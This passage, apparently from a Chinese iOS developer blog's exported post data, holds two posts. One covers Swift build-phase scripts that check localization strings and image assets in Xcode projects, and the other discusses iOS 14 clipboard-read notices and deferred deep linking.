Carstens-Peters緣由因為自己手殘，時常在編輯多語系檔案時遺漏「;」導致 app build 出來語言顯示出錯再加上隨著開發的推移語系檔案越來越龐大，重複的、已沒用到的語句都夾雜再一起，非常混亂（Image Assets 同樣狀況）。一直以來都想找工具協助處理這方面的問題，之前是用 iOSLocalizationEditor 這個 Mac APP，但它比較像是語系檔案編輯器，讀取語系檔案內容＆編輯，沒有自動檢查的功能。期望功能build 專案時能自動檢查多語系有無錯誤、缺露、重複、Image Assets 有無缺漏。解決方案要達到我們的期望功能就要在 Build Phases 加入 Run Script 檢查腳本。但檢查腳本需要使用 shell script 撰寫，因自己對 shell script 的掌握度並不太高，想說站在巨人的肩膀上從網路搜尋現有腳本也找不太到完全符合期望功能的 script，再快要放棄的時候突然想到： Shell Script 可以用 Swift 來寫啊 ！相對 shell script 來說更熟悉、掌握度更高！依照這個方向果然讓我找到兩個現有的工具腳本！由 freshOS 這個團隊撰寫的兩個檢查工具： Localize 🏁 Asset Checker 👮完全符合我們的期望功能需求! ! 並且他們使用 swift 撰寫，要客製化魔改都很容易。Localize 🏁 多語系檔檢查工具功能： build 時自動檢查 語系檔自動排版、整理 檢查多語系與主要語系之缺漏、多餘 檢查多語系重複語句 檢查多語系未經翻譯語句 檢查多語系未使用的語句安裝方法： 下載工具的 Swift Script 檔案 放到專案目錄下 EX: ${SRCROOT}/Localize.swift 打開專案設定 → iOS Target → Build Phases →左上角「+」 → New Run Script Phases → 在 Script 內容貼上路徑 EX: ${SRCROOT}/Localize.swift4. 使用 Xcode 打開編輯 Localize.swift 檔案進行設定，可以在檔案上半部看到可更動的設定項目：//啟用檢查腳本let enabled = true//語系檔案目錄let relativeLocalizableFolders = \"/Resources/Languages\"//專案目錄（用來搜索語句有沒有在程式碼中使用到）let relativeSourceFolder = \"/Sources\"//程式碼中的 NSLocalized 語系檔案使用正規匹配表示法//可自行增加、無需變動let patterns = [ \"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([\\\\w\\\\.]+)\\\"\", // Swift and Objc Native \"Localizations\\\\.((?:[A-Z]{1}[a-z]*[A-z]*)*(?:\\\\.[A-Z]{1}[a-z]*[A-z]*)*)\", // Laurine Calls \"L10n.tr\\\\(key: \\\"(\\\\w+)\\\"\", // SwiftGen generation \"ypLocalized\\\\(\\\"(.*)\\\"\\\\)\", \"\\\"(.*)\\\".localized\" // \"key\".localized pattern]//要忽略「語句未使用警告」的語句let ignoredFromUnusedKeys: [String] = []/* examplelet ignoredFromUnusedKeys = [ \"NotificationNoOne\", \"NotificationCommentPhoto\", \"NotificationCommentHisPhoto\", \"NotificationCommentHerPhoto\"]*///主要語系let masterLanguage = \"en\"//開啟與係檔案a-z排序、整理功能let sanitizeFiles = false//專案是單一or多語系let singleLanguage = false//啟用檢查未翻譯語句功能let checkForUntranslated = true5. Build！成功！檢查結果提示類型： Build Error ❌ ： - [Duplication] 項目在語系檔案內存在重複- [Unused Key] 項目在語系檔案內有定義，但實際程式中未使用到- [Missing] 項目在語系檔案內未定義，但實際程式中有使用到- [Redundant] 項目在此語系檔相較於主要語系檔是多餘的- [Missing Translation] 項目在主要語系檔有，但在此語系檔缺漏 Build Warning ⚠️ ： - [Potentially Untranslated] 此項目未經翻譯（與主語系檔項目內容相同） 還沒結束，現在自動檢查提示有了，但我們還需要自行魔改一下。客製化匹配正規表示：回頭看檢查腳本 Localize.swift 頂部設定區塊 patterns 部分的第一項：\"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([\\\\w\\\\.]+)\\\"\"匹配 Swift/ObjC的 NSLocalizedString() 方法，這個正規表示式只能匹配 \"Home.Title\" 這種格式的語句；假設我們是完整句子或有帶 Format 參數，則會被當誤當成 [Unused Key]。EX: \"Hi, %@ welcome to my app\"、\"Hello World!\" &lt;- 這些語句都無法匹配我們可以新增一條 patterns 設定、或更改原本的 patterns 成：\"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([^(\\\")]+)\\\"\"主要是調整 NSLocalizedString 方法後的匹配語句，變成取任意字串直到 \" 出現就中止，你也可以 點此 依照自己的需求進行客製。加上語系檔案格式檢查功能：此腳本僅針對語系檔做內容對應檢查，不會檢查檔案格式是否正確（是否有忘記加「 ; 」），如果需要這個功能要自己加上！//....let formatResult = shell(\"plutil -lint \\(location)\")guard formatResult.trimmingCharacters(in: .whitespacesAndNewlines).suffix(2) == \"OK\" else { let str = \"\\(path)/\\(name).lproj\" + \"/Localizable.strings:1: \" + \"error: [File Invaild] \" + \"This Localizable.strings file format is invalid.\" print(str) numberOfErrors += 1 return}//....func shell(_ command: String) -&gt; String { let task = Process() let pipe = Pipe() task.standardOutput = pipe task.arguments = [\"-c\", command] task.launchPath = \"/bin/bash\" task.launch() let data = pipe.fileHandleForReading.readDataToEndOfFile() let output = String(data: data, encoding: .utf8)! return output}增加 shell() 執行 shell script，使用 plutil -lint 檢查 plist 語系檔案格式正確性，有錯、少「;」會回傳錯誤，沒錯會回傳 OK 以此作為判斷！檢查的地方可加在 LocalizationFiles-&gt;process( ) -&gt; let location = singleLanguage… 後，約 135 行的地方或參考我最後提供的完整魔改版。其他客製化：我們可以依照自己的需求進行客製，例如把 error 換成 warning 或是拔掉某個檢查功能 (EX: Potentially Untranslated、Unused Key)；腳本就是 swift 我們都很熟悉！不怕改壞改錯！要讓 build 時出現 Error ❌：print(\"Project檔案.lproj\" + \"/檔案:行: \" + \"error: 錯誤訊息\")要讓 build 時出現 Warning ⚠️：print(\"Project檔案.lproj\" + \"/檔案:行: \" + \"warning: 警告訊息\")最終魔改版：#!/usr/bin/env xcrun --sdk macosx swiftimport Foundation// WHAT// 1. Find Missing keys in other Localisation files// 2. Find potentially untranslated keys// 3. Find Duplicate keys// 4. Find Unused keys and generate script to delete them all at once// MARK: Start Of Configurable Section/* You can enable or disable the script whenever you want */let enabled = true/* Put your path here, example -&gt; Resources/Localizations/Languages */let relativeLocalizableFolders = \"/streetvoice/SupportingFiles\"/* This is the path of your source folder which will be used in searching for the localization keys you actually use in your project */let relativeSourceFolder = \"/streetvoice\"/* Those are the regex patterns to recognize localizations. */let patterns = [ \"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([^(\\\")]+)\\\"\", // Swift and Objc Native \"Localizations\\\\.((?:[A-Z]{1}[a-z]*[A-z]*)*(?:\\\\.[A-Z]{1}[a-z]*[A-z]*)*)\", // Laurine Calls \"L10n.tr\\\\(key: \\\"(\\\\w+)\\\"\", // SwiftGen generation \"ypLocalized\\\\(\\\"(.*)\\\"\\\\)\", \"\\\"(.*)\\\".localized\" // \"key\".localized pattern]/* Those are the keys you don't want to be recognized as \"unused\" For instance, Keys that you concatenate will not be detected by the parsing so you want to add them here in order not to create false positives :) */let ignoredFromUnusedKeys: [String] = []/* examplelet ignoredFromUnusedKeys = [ \"NotificationNoOne\", \"NotificationCommentPhoto\", \"NotificationCommentHisPhoto\", \"NotificationCommentHerPhoto\"]*/let masterLanguage = \"base\"/* Sanitizing files will remove comments, empty lines and order your keys alphabetically. */let sanitizeFiles = false/* Determines if there are multiple localizations or not. */let singleLanguage = false/* Determines if we should show errors if there's a key within the app that does not appear in master translations.*/let checkForUntranslated = false// MARK: End Of Configurable Sectionif enabled == false { print(\"Localization check cancelled\") exit(000)}// Detect list of supported languages automaticallyfunc listSupportedLanguages() -&gt; [String] { var sl: [String] = [] let path = FileManager.default.currentDirectoryPath + relativeLocalizableFolders if !FileManager.default.fileExists(atPath: path) { print(\"Invalid configuration: \\(path) does not exist.\") exit(1) } let enumerator = FileManager.default.enumerator(atPath: path) let extensionName = \"lproj\" print(\"Found these languages:\") while let element = enumerator?.nextObject() as? String { if element.hasSuffix(extensionName) { print(element) let name = element.replacingOccurrences(of: \".\\(extensionName)\", with: \"\") sl.append(name) } } return sl}let supportedLanguages = listSupportedLanguages()var ignoredFromSameTranslation: [String: [String]] = [:]let path = FileManager.default.currentDirectoryPath + relativeLocalizableFoldersvar numberOfWarnings = 0var numberOfErrors = 0struct LocalizationFiles { var name = \"\" var keyValue: [String: String] = [:] var linesNumbers: [String: Int] = [:] init(name: String) { self.name = name process() } mutating func process() { if sanitizeFiles { removeCommentsFromFile() removeEmptyLinesFromFile() sortLinesAlphabetically() } let location = singleLanguage ? \"\\(path)/Localizable.strings\" : \"\\(path)/\\(name).lproj/Localizable.strings\" let formatResult = shell(\"plutil -lint \\(location)\") guard formatResult.trimmingCharacters(in: .whitespacesAndNewlines).suffix(2) == \"OK\" else { let str = \"\\(path)/\\(name).lproj\" + \"/Localizable.strings:1: \" + \"error: [File Invaild] \" + \"This Localizable.strings file format is invalid.\" print(str) numberOfErrors += 1 return } guard let string = try? String(contentsOfFile: location, encoding: .utf8) else { return } let lines = string.components(separatedBy: .newlines) keyValue = [:] let pattern = \"\\\"(.*)\\\" = \\\"(.+)\\\";\" let regex = try? NSRegularExpression(pattern: pattern, options: []) var ignoredTranslation: [String] = [] for (lineNumber, line) in lines.enumerated() { let range = NSRange(location: 0, length: (line as NSString).length) // Ignored pattern let ignoredPattern = \"\\\"(.*)\\\" = \\\"(.+)\\\"; *\\\\/\\\\/ *ignore-same-translation-warning\" let ignoredRegex = try? NSRegularExpression(pattern: ignoredPattern, options: []) if let ignoredMatch = ignoredRegex?.firstMatch(in: line, options: [], range: range) { let key = (line as NSString).substring(with: ignoredMatch.range(at: 1)) ignoredTranslation.append(key) } if let firstMatch = regex?.firstMatch(in: line, options: [], range: range) { let key = (line as NSString).substring(with: firstMatch.range(at: 1)) let value = (line as NSString).substring(with: firstMatch.range(at: 2)) if keyValue[key] != nil { let str = \"\\(path)/\\(name).lproj\" + \"/Localizable.strings:\\(linesNumbers[key]!): \" + \"error: [Duplication] \\\"\\(key)\\\" \" + \"is duplicated in \\(name.uppercased()) file\" print(str) numberOfErrors += 1 } else { keyValue[key] = value linesNumbers[key] = lineNumber + 1 } } } print(ignoredFromSameTranslation) ignoredFromSameTranslation[name] = ignoredTranslation } func rebuildFileString(from lines: [String]) -&gt; String { return lines.reduce(\"\") { (r: String, s: String) -&gt; String in (r == \"\") ? (r + s) : (r + \"\\n\" + s) } } func removeEmptyLinesFromFile() { let location = \"\\(path)/\\(name).lproj/Localizable.strings\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { var lines = string.components(separatedBy: .newlines) lines = lines.filter { $0.trimmingCharacters(in: .whitespaces) != \"\" } let s = rebuildFileString(from: lines) try? s.write(toFile: location, atomically: false, encoding: .utf8) } } func removeCommentsFromFile() { let location = \"\\(path)/\\(name).lproj/Localizable.strings\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { var lines = string.components(separatedBy: .newlines) lines = lines.filter { !$0.hasPrefix(\"//\") } let s = rebuildFileString(from: lines) try? s.write(toFile: location, atomically: false, encoding: .utf8) } } func sortLinesAlphabetically() { let location = \"\\(path)/\\(name).lproj/Localizable.strings\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { let lines = string.components(separatedBy: .newlines) var s = \"\" for (i, l) in sortAlphabetically(lines).enumerated() { s += l if i != lines.count - 1 { s += \"\\n\" } } try? s.write(toFile: location, atomically: false, encoding: .utf8) } } func removeEmptyLinesFromLines(_ lines: [String]) -&gt; [String] { return lines.filter { $0.trimmingCharacters(in: .whitespaces) != \"\" } } func sortAlphabetically(_ lines: [String]) -&gt; [String] { return lines.sorted() }}// MARK: - Load Localisation Files in memorylet masterLocalizationFile = LocalizationFiles(name: masterLanguage)let localizationFiles = supportedLanguages .filter { $0 != masterLanguage } .map { LocalizationFiles(name: $0) }// MARK: - Detect Unused Keyslet sourcesPath = FileManager.default.currentDirectoryPath + relativeSourceFolderlet fileManager = FileManager.defaultlet enumerator = fileManager.enumerator(atPath: sourcesPath)var localizedStrings: [String] = []while let swiftFileLocation = enumerator?.nextObject() as? String { // checks the extension if swiftFileLocation.hasSuffix(\".swift\") || swiftFileLocation.hasSuffix(\".m\") || swiftFileLocation.hasSuffix(\".mm\") { let location = \"\\(sourcesPath)/\\(swiftFileLocation)\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { for p in patterns { let regex = try? NSRegularExpression(pattern: p, options: []) let range = NSRange(location: 0, length: (string as NSString).length) // Obj c wa regex?.enumerateMatches(in: string, options: [], range: range, using: { result, _, _ in if let r = result { let value = (string as NSString).substring(with: r.range(at: r.numberOfRanges - 1)) localizedStrings.append(value) } }) } } }}var masterKeys = Set(masterLocalizationFile.keyValue.keys)let usedKeys = Set(localizedStrings)let ignored = Set(ignoredFromUnusedKeys)let unused = masterKeys.subtracting(usedKeys).subtracting(ignored)let untranslated = usedKeys.subtracting(masterKeys)// Here generate Xcode regex Find and replace script to remove dead keys all at once!var replaceCommand = \"\\\"(\"var counter = 0for v in unused { var str = \"\\(path)/\\(masterLocalizationFile.name).lproj/Localizable.strings:\\(masterLocalizationFile.linesNumbers[v]!): \" str += \"error: [Unused Key] \\\"\\(v)\\\" is never used\" print(str) numberOfErrors += 1 if counter != 0 { replaceCommand += \"|\" } replaceCommand += v if counter == unused.count - 1 { replaceCommand += \")\\\" = \\\".*\\\";\" } counter += 1}print(replaceCommand)// MARK: - Compare each translation file against master (en)for file in localizationFiles { for k in masterLocalizationFile.keyValue.keys { if file.keyValue[k] == nil { var str = \"\\(path)/\\(file.name).lproj/Localizable.strings:\\(masterLocalizationFile.linesNumbers[k]!): \" str += \"error: [Missing] \\\"\\(k)\\\" missing from \\(file.name.uppercased()) file\" print(str) numberOfErrors += 1 } } let redundantKeys = file.keyValue.keys.filter { !masterLocalizationFile.keyValue.keys.contains($0) } for k in redundantKeys { let str = \"\\(path)/\\(file.name).lproj/Localizable.strings:\\(file.linesNumbers[k]!): \" + \"error: [Redundant key] \\\"\\(k)\\\" redundant in \\(file.name.uppercased()) file\" print(str) }}if checkForUntranslated { for key in untranslated { var str = \"\\(path)/\\(masterLocalizationFile.name).lproj/Localizable.strings:1: \" str += \"error: [Missing Translation] \\(key) is not translated\" print(str) numberOfErrors += 1 }}print(\"Number of warnings : \\(numberOfWarnings)\")print(\"Number of errors : \\(numberOfErrors)\")if numberOfErrors &gt; 0 { exit(1)}func shell(_ command: String) -&gt; String { let task = Process() let pipe = Pipe() task.standardOutput = pipe task.arguments = [\"-c\", command] task.launchPath = \"/bin/bash\" task.launch() let data = pipe.fileHandleForReading.readDataToEndOfFile() let output = String(data: data, encoding: .utf8)! return output} 最後最後，還沒結束！當我們的 swift 檢查工具腳本都調試完成之後，要將其 compile 成執行檔減少 build 花費時間 ，否則每次 build 都要重新 compile 一次（約能減少 90% 的時間）。打開 terminal ，前往專案中檢查工具腳本所在目錄下執行：swiftc -o Localize Localize.swift然後再回頭到 Build Phases 更改 Script 內容路徑成執行檔EX: ${SRCROOT}/Localize完工！工具 2. Asset Checker 👮 圖片資源檢查工具功能： build 時自動檢查 檢查圖片缺漏：名稱有呼叫，但圖片資源目錄內沒有出現 檢查圖片多餘：名稱未使用，但圖片資源目錄存在的安裝方法： 下載工具的 Swift Script 檔案 放到專案目錄下 EX: ${SRCROOT}/AssetChecker.swift 打開專案設定 → iOS Target → Build Phases →左上角「+」 → New Run Script Phases → 在 Script 內容貼上路徑${SRCROOT}/AssetChecker.swift ${SRCROOT}/專案目錄 ${SRCROOT}/Resources/Images.xcassets//${SRCROOT}/Resources/Images.xcassets = 你 .xcassets 的位置可直接將設定參數帶在路徑上，參數1:專案目錄位置、參數2:圖片資源目錄位置；或跟語系檢查工具一樣編輯 AssetChecker.swift 頂部參數設定區塊：// Configure me \\o/// 專案目錄位置（用來搜索圖片有沒有在程式碼中使用到）var sourcePathOption:String? = nil// .xcassets 目錄位置var assetCatalogPathOption:String? = nil// Unused 警告忽略項目let ignoredUnusedNames = [String]()4. Build！ 成功！檢查結果提示類型： Build Error ❌ ： - [Asset Missing] 項目在程式內有呼叫使用，但圖片資源目錄內沒有出現 Build Warning ⚠️ ： - [Asset Unused] 項目在程式內未使用，但圖片資源目錄內有出現p.s 假設圖片是動態變數提供，檢查工具將無法識別，可將其加入 ignoredUnusedNames 中設為例外。其他操作同語系檢查工具，這邊就不做贅述；最重要的事是也要 記得調適完後要 compile 成執行檔，並更改 run script 內容為執行檔！開發自己的工具！ 我們可以參考圖片資源檢查工具腳本：#!/usr/bin/env xcrun --sdk macosx swiftimport Foundation// Configure me \\o/var sourcePathOption:String? = nilvar assetCatalogPathOption:String? = nillet ignoredUnusedNames = [String]()for (index, arg) in CommandLine.arguments.enumerated() { switch index { case 1: sourcePathOption = arg case 2: assetCatalogPathOption = arg default: break }}guard let sourcePath = sourcePathOption else { print(\"AssetChecker:: error: Source path was missing!\") exit(0)}guard let assetCatalogAbsolutePath = assetCatalogPathOption else { print(\"AssetChecker:: error: Asset Catalog path was missing!\") exit(0)}print(\"Searching sources in \\(sourcePath) for assets in \\(assetCatalogAbsolutePath)\")/* Put here the asset generating false positives, For instance whne you build asset names at runtimelet ignoredUnusedNames = [ \"IconArticle\", \"IconMedia\", \"voteEN\", \"voteES\", \"voteFR\"] */// MARK : - End Of Configurable Sectionfunc elementsInEnumerator(_ enumerator: FileManager.DirectoryEnumerator?) -&gt; [String] { var elements = [String]() while let e = enumerator?.nextObject() as? String { elements.append(e) } return elements}// MARK: - List Assetsfunc listAssets() -&gt; [String] { let extensionName = \"imageset\" let enumerator = FileManager.default.enumerator(atPath: assetCatalogAbsolutePath) return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(extensionName) } // Is Asset .map { $0.replacingOccurrences(of: \".\\(extensionName)\", with: \"\") } // Remove extension .map { $0.components(separatedBy: \"/\").last ?? $0 } // Remove folder path}// MARK: - List Used Assets in the codebasefunc localizedStrings(inStringFile: String) -&gt; [String] { var localizedStrings = [String]() let namePattern = \"([\\\\w-]+)\" let patterns = [ \"#imageLiteral\\\\(resourceName: \\\"\\(namePattern)\\\"\\\\)\", // Image Literal \"UIImage\\\\(named:\\\\s*\\\"\\(namePattern)\\\"\\\\)\", // Default UIImage call (Swift) \"UIImage imageNamed:\\\\s*\\\\@\\\"\\(namePattern)\\\"\", // Default UIImage call \"\\\\&lt;image name=\\\"\\(namePattern)\\\".*\", // Storyboard resources \"R.image.\\(namePattern)\\\\(\\\\)\" //R.swift support ] for p in patterns { let regex = try? NSRegularExpression(pattern: p, options: []) let range = NSRange(location:0, length:(inStringFile as NSString).length) regex?.enumerateMatches(in: inStringFile,options: [], range: range) { result, _, _ in if let r = result { let value = (inStringFile as NSString).substring(with:r.range(at: 1)) localizedStrings.append(value) } } } return localizedStrings}func listUsedAssetLiterals() -&gt; [String] { let enumerator = FileManager.default.enumerator(atPath:sourcePath) print(sourcePath) #if swift(&gt;=4.1) return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") || $0.hasSuffix(\".swift\") || $0.hasSuffix(\".xib\") || $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .compactMap{$0} .compactMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings ocurrences .flatMap{$0} // Flatten #else return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") || $0.hasSuffix(\".swift\") || $0.hasSuffix(\".xib\") || $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .flatMap{$0} .flatMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings ocurrences .flatMap{$0} // Flatten #endif}// MARK: - Begining of scriptlet assets = Set(listAssets())let used = Set(listUsedAssetLiterals() + ignoredUnusedNames)// Generate Warnings for Unused Assetslet unused = assets.subtracting(used)unused.forEach { print(\"\\(assetCatalogAbsolutePath):: warning: [Asset Unused] \\($0)\") }// Generate Error for broken Assetslet broken = used.subtracting(assets)broken.forEach { print(\"\\(assetCatalogAbsolutePath):: error: [Asset Missing] \\($0)\") }if broken.count &gt; 0 { exit(1)}相較於語系檢查腳本，這個腳本簡潔且重要的功能都有，很有參考價值！P.S 可以看到程式碼出現 localizedStrings() 命名，懷疑作者是從語系檢查工具的邏輯搬來用，忘了改方法名稱ＸＤ例如：for (index, arg) in CommandLine.arguments.enumerated() { switch index { case 1: //參數1 case 2: //參數2 default: break }}^接收外部參數的方法func elementsInEnumerator(_ enumerator: FileManager.DirectoryEnumerator?) -&gt; [String] { var elements = [String]() while let e = enumerator?.nextObject() as? String { elements.append(e) } return elements}func localizedStrings(inStringFile: String) -&gt; [String] { var localizedStrings = [String]() let namePattern = \"([\\\\w-]+)\" let patterns = [ \"#imageLiteral\\\\(resourceName: \\\"\\(namePattern)\\\"\\\\)\", // Image Literal \"UIImage\\\\(named:\\\\s*\\\"\\(namePattern)\\\"\\\\)\", // Default UIImage call (Swift) \"UIImage imageNamed:\\\\s*\\\\@\\\"\\(namePattern)\\\"\", // Default UIImage call \"\\\\&lt;image name=\\\"\\(namePattern)\\\".*\", // Storyboard resources \"R.image.\\(namePattern)\\\\(\\\\)\" //R.swift support ] for p in patterns { let regex = try? NSRegularExpression(pattern: p, options: []) let range = NSRange(location:0, length:(inStringFile as NSString).length) regex?.enumerateMatches(in: inStringFile,options: [], range: range) { result, _, _ in if let r = result { let value = (inStringFile as NSString).substring(with:r.range(at: 1)) localizedStrings.append(value) } } } return localizedStrings}func listUsedAssetLiterals() -&gt; [String] { let enumerator = FileManager.default.enumerator(atPath:sourcePath) print(sourcePath) #if swift(&gt;=4.1) return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") || $0.hasSuffix(\".swift\") || $0.hasSuffix(\".xib\") || $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .compactMap{$0} .compactMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings ocurrences .flatMap{$0} // Flatten #else return elementsInEnumerator(enumerator) .filter { $0.hasSuffix(\".m\") || $0.hasSuffix(\".swift\") || $0.hasSuffix(\".xib\") || $0.hasSuffix(\".storyboard\") } // Only Swift and Obj-C files .map { \"\\(sourcePath)/\\($0)\" } // Build file paths .map { try? String(contentsOfFile: $0, encoding: .utf8)} // Get file contents .flatMap{$0} .flatMap{$0} // Remove nil entries .map(localizedStrings) // Find localizedStrings ocurrences .flatMap{$0} // Flatten #endif}^遍歷所有專案檔案並進行正則匹配的方法//要讓 build 時出現 Error ❌：print(\"Project檔案.lproj\" + \"/檔案:行: \" + \"error: 錯誤訊息\")//要讓 build 時出現 Warning ⚠️：print(\"Project檔案.lproj\" + \"/檔案:行: \" + \"warning: 警告訊息\")^print error or warning可以綜合參考以上的程式方法，自己打造想要的工具。總結這兩個檢查工具導入之後，我們在開發上就能更安心、更有效率並且減少冗餘；也因為這次經驗大開眼界，日後如果有什麼新的 build run script 需求都能直接使用最熟悉的語言 swift 來進行製作！有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 2,701 Total Views Last Statistics Date: 2025-01-19 | 2,564 Views on Medium. " }, { "title": "iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難", "url": "/posts/8a04443024e2/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, ios-14, hacking, security", "date": "2020-07-02 21:51:36 +0800", "snippet": "iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難為何那麼多 iOS APP 會讀取你的剪貼簿？Photo by Clint Patterson⚠️ 2022/07/22 Update: iOS 16 Upcoming ChangesiOS ≥ 16 開始非使用者主動操作貼上動作，App 主動讀取剪貼簿的行為會跳出詢問視窗，使用者需要按允許，App 才能讀取到剪貼簿資訊。UIPasteBoard...", "content": "iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難為何那麼多 iOS APP 會讀取你的剪貼簿？Photo by Clint Patterson⚠️ 2022/07/22 Update: iOS 16 Upcoming ChangesiOS ≥ 16 開始非使用者主動操作貼上動作，App 主動讀取剪貼簿的行為會跳出詢問視窗，使用者需要按允許，App 才能讀取到剪貼簿資訊。UIPasteBoard’s privacy change in iOS 16議題剪貼簿被 APP 讀取時的頂部提示訊息iOS 14 開始會提示使用者 APP 讀取了您的剪貼簿，尤其中國大陸的 APP 本來就惡名昭彰，再加上媒體不斷的放大報導，造成不小的隱私恐慌；但其實不只中國 APP， 美國 、台灣、日本…世界各地很多大大小小的 APP 全都現形，那到底是為了什麼那麼多 APP 都需要讀取剪貼簿呢？Google Search安全剪貼簿可能包含個人隱私甚至密碼，如使用 1Password、LastPass…等密碼管理器複製密碼；APP 有能力讀取到就有能力回傳回伺服器記錄，一切看開發者的良心，真要查的話可透過使用 中間人嗅探 ，監聽 APP 回傳回伺服器的資料，是否包含剪貼簿資訊。淵源剪貼簿 API ，從 iOS 3 2009 年開始就有，只是從 iOS 14 開始會多跳提示告知使用者而已，中間已過十餘年，如果是惡意的 APP 也收集夠足夠的資料了。為何為何那麼多 APP 不論國內外都會在 打開時 讀取剪貼簿呢？這邊要先定義一下，我說的情況是 「APP 打開時」 ，而不是 APP 使用中讀取剪貼簿；APP 使用中讀取的情況比較偏是 APP 內的功能應用，像是 Goolge Map 自動貼上剛複製的地址、但也不排除有的 APP 會不斷偷取剪貼簿資訊。 「一把菜刀可以切菜也可以殺人，取決於用的人拿來做什麼」APP 打開時會讀取剪貼簿主要原因是要做「 iOS Deferred Deep Link 」 加強使用者體驗 ，如上流程所示；當一個產品同時提供網頁及APP時，我們更希望使用者能安裝 APP（因黏著度更高），所以當使用者瀏覽網頁版網站時會導引下載 APP，但我們希望下載完開啟 APP 會自動打開網頁離開時的頁面。 EX: 當我在 safari 逛 PxHome 手機網頁版 -&gt; 看到喜歡的產品想要購買 -&gt; PxHome 希望流量導 APP -&gt; 下載 APP -&gt; 打開 APP -&gt; 展現剛網頁看到的商品如果不這樣做，使用者只能 1. 回到網頁上再點一次 2. 在 APP 內重新搜尋一次產品；不管 1 還是 2 都會增加使用者購買上的困難及猶豫時間，可能就不買了！另一方面以營運來說，知道從哪個來源成功安裝的統計，對行銷、廣告預算投放都有很大的幫助。為何一定要用剪貼簿，有無其他替代方式？這是場 貓鼠遊戲 ，因為 iOS 蘋果本身不希望開發者有辦法反向追蹤使用者來源，iOS 9 之前的做法是將資訊存入網頁 Cookie，APP 安裝完後再讀取 Cookie 出來用，iOS 10 之後這條路被蘋果封住無法使用；退無可退大家才使用最終技 — 「用剪貼簿傳資訊」來達成，iOS 14 再次遞出新招，提示使用者讓開發者尷尬。另一條路是使用 Branch.io 的方式，記錄使用者輪廓(IP、手機資訊)，然後用搓合的方式讀取資訊，原理上可行，但需要投入大量人力(牽涉到後端、資料庫、APP)去研究實作，且可能會誤判或碰撞。 *對面的 Android Google 原本就支援此功能，不用像 iOS 這樣繞來繞去。受影響的 APP可能很多 APP 開發者都不知道自己也出現剪貼簿隱私問題，因為 Google 的 Firebase Dynamic Links 服務也是使用同樣的原理實現：// Reason for this string to ensure that only FDL links, copied to clipboard by AppPreview Page// JavaScript code, are recognized and used in copy-unique-match process. If user copied FDL to// clipboard by himself, that link must not be used in copy-unique-match process.// This constant must be kept in sync with constant in the server version at// durabledeeplink/click/ios/click_page.js 所以任何有使用到 Google Firebase Dynamic Links 服務的 APP 都可能中槍剪貼簿隱私問題！個人觀點資安問題是有的，但就是「 信任」 ，信任開發者是拿來做正確的事；如果開發者要做惡，有更多的地方可以做惡，例如：偷取信用卡資訊、偷記錄真實密碼…等等，都要比這個有效的多。 提示的用途就是讓使用者能注意到剪貼簿讀取的時間點，如果不合理就要小心！讀者提問Q：「TikTok 回應存取剪貼簿是為了偵測濫發垃圾訊息的行為」這種說法是正確的嗎？A：我個人認為只是找個理由搪塞輿論，抖音的意思應該是「為了防止使用者四處複製貼上廣告訊息」；但實際可以在訊息輸入完成時或是送出訊息時再做阻擋過濾，沒必要時時監聽使用者剪貼簿的資訊！難道剪貼簿有廣告或「敏感」訊息也要管？我又沒貼上發表出去。開發者能做的事若手邊沒有備用機可升級 iOS 14 測試，可先從 Apple 下載 XCode 12 用模擬器測看看。一切都還太新，如果你是串 Firebase 可以先參考 Firebase-iOS-SDK/Issue #5893 更新到最新的 SDK。如果是自己實作 DeepLink 可以參考 Firebase-iOS-SDK #PR 5905 的修改：Swift:if #available(iOS 10.0, *) { if (UIPasteboard.general.hasURLs) { //UIPasteboard.general.string }} else { //UIPasteboard.general.string}Objective-C:if (@available(iOS 10.0, *)) { if ([[UIPasteboard generalPasteboard] hasURLs]) { //[UIPasteboard generalPasteboard].string; } } else { //[UIPasteboard generalPasteboard].string; } return pasteboardContents;}先檢查剪貼簿內容是否為網址（配合網頁 JavaScript 複製的內容是網址帶參數）是才讀取，就不會每次開啟 APP 都跳剪貼簿被讀取。 目前只能如此，提示跳還是會跳，就只是讓他更聚焦一點另外蘋果也增加了新的 API： DetectPattern ，幫助開發者能更精確判斷剪貼簿資訊是我們要的，然後再讀取，再跳提示，使用者能更安心、開發者也能繼續使用此功能。 DetectPattern 也還在 Beta、且僅能使用 Objective-C 實作。或是… 改用 Branch.io 自行實作 Branch.io 的原理 APP 先跳客製化 Alert 告知使用者，再讀取剪貼簿（讓使用者安心） 加入新隱私權條款 iOS 14 最新的 App Clips?，網頁 -&gt; 導 App Clips 輕量使用 -&gt; 深入操作導 APP延伸閱讀 iOS Deferred Deep Link 延遲深度連結實作(Swift) iOS+MacOS 使用mitmproxy 進行中間人嗅探 iOS 15 / MacOS Monterey Safari 將能隱藏真實 IP有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 15,275 Total Views Last Statistics Date: 